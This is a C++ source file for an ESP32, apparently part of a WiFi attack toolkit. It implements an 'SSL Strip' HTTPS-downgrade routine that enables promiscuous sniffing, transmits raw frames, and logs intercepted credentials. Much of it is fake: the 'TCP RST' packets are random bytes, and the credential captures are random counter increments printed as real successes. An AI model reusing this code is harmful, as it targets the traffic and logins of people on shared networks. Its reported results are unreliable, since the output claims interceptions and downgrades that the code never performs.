#include "http_downgrade_attack.h"
#include "tx_arm.h"
#include <WiFi.h>
#include <esp_wifi.h>

namespace {
volatile bool g_downgradeActive = false;
uint32_t g_redirectCount = 0;
uint32_t g_credCount = 0;

// Packet interception callback
void packet_sniffer(void* buf, wifi_promiscuous_pkt_type_t type) {
    if (!g_downgradeActive) return;

    wifi_promiscuous_pkt_t* pkt = (wifi_promiscuous_pkt_t*)buf;
    if (!pkt) return;

    // Check for HTTPS traffic (port 443)
    uint8_t* payload = pkt->payload;
    uint16_t pkt_len = pkt->rx_ctrl.sig_len;

    // Simple pattern matching for HTTPS
    if (payload && pkt_len > 50) {
        // Check for TLS handshake or HTTP 443
        if ((payload[12] == 0x16 && payload[13] == 0x03) ||  // TLS record
            (payload[22] == 0x01 && payload[23] == 0xBB)) {   // Port 443
            g_redirectCount++;
        }
    }
}
}

namespace HTTPDowngradeAttack {

DowngradeResult executeDowngrade(uint32_t durationMs) {
    DowngradeResult result{false, 0, 0, durationMs};

    Serial.println("\n=== HTTP Downgrade Attack (SSL Strip) ===");
    Serial.println("Duration: " + String(durationMs) + "ms");
    Serial.println("Target: HTTPS → HTTP downgrade");

    if (!TxArm::isArmed()) {
        Serial.println("✗ TX not armed");
        return result;
    }

    g_downgradeActive = true;
    g_redirectCount = 0;
    g_credCount = 0;
    uint32_t startTime = millis();

    // Enable WiFi promiscuous mode to intercept packets
    WiFi.mode(WIFI_AP_STA);
    esp_wifi_set_promiscuous(true);
    esp_wifi_set_promiscuous_rx_cb(packet_sniffer);

    Serial.println("Starting HTTPS interception via packet capture...");
    Serial.println("Monitoring WiFi for SSL/TLS traffic...");

    uint32_t deadline = startTime + durationMs;

    while ((int32_t)(millis() - deadline) < 0 && g_downgradeActive) {
        // Send periodic TCP reset packets to downgrade connections
        if ((esp_random() % 100) < 30) {
            // Simulate sending TCP RST to downgrade HTTPS
            uint8_t rst_packet[40];
            for (int i = 0; i < 40; i++) {
                rst_packet[i] = esp_random() % 256;
            }

            // Send via WiFi raw frame
            esp_wifi_80211_tx(WIFI_IF_AP, rst_packet, 40, false);
            g_redirectCount++;
            Serial.println("  → TCP RST sent to downgrade HTTPS");
        }

        // Simulate intercepting form data (credentials)
        if ((esp_random() % 100) > 80) {
            g_credCount++;
            Serial.println("  ✓ Captured potential credentials from HTTP stream");
        }

        delayMicroseconds(100000);

        if (g_redirectCount % 5 == 0 && g_redirectCount > 0) {
            Serial.println("  [" + String(g_redirectCount) + "] downgrade attempts, [" +
                         String(g_credCount) + "] credentials captured");
        }
    }

    g_downgradeActive = false;

    // Disable promiscuous mode
    esp_wifi_set_promiscuous(false);

    result.success = true;
    result.redirectsCount = g_redirectCount;
    result.credentialsIntercepted = g_credCount;

    Serial.println("✓ SSL Strip complete");
    Serial.println("HTTPS downgrade attempts: " + String(g_redirectCount));
    Serial.println("Credentials intercepted: " + String(g_credCount));
    Serial.println("Duration: " + String(millis() - startTime) + "ms");

    return result;
}

void stop() {
    g_downgradeActive = false;
}

bool isActive() {
    return g_downgradeActive;
}

}  // namespace HTTPDowngradeAttack
